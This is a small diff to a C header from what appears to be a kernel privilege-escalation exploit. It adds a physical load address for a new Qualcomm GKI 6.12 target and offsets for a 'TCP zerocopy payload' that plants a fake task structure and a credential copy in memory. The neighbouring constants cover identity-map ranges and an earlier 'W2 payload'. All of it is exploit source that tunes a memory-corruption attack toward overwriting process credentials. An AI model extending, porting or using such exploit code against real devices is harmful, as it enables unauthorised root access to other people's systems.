@@ -9,6 +9,7 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
+#define QC_GKI_6_12_PHYS_LOAD 0xc7800000ULL
 #define XRING_KERNEL_PHYS_LOAD 0x80200000ULL
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END 0xffffff8c00000000ULL
@@ -103,5 +104,11 @@
 
 /* W2 payload. */
 #define CRED_COPY_OFF 0x1080
+
+/* TCP zerocopy payload offsets: fake_task sits at 0x5800 so it clears the
+ * fake_lock rb_leftmost zone; the cred copy follows because the pselect
+ * 0x1080 slot would land inside fake_task. */
+#define TCP_FAKE_TASK_OFF 0x5800
+#define TCP_CRED_COPY_OFF 0x6800
 
 #endif
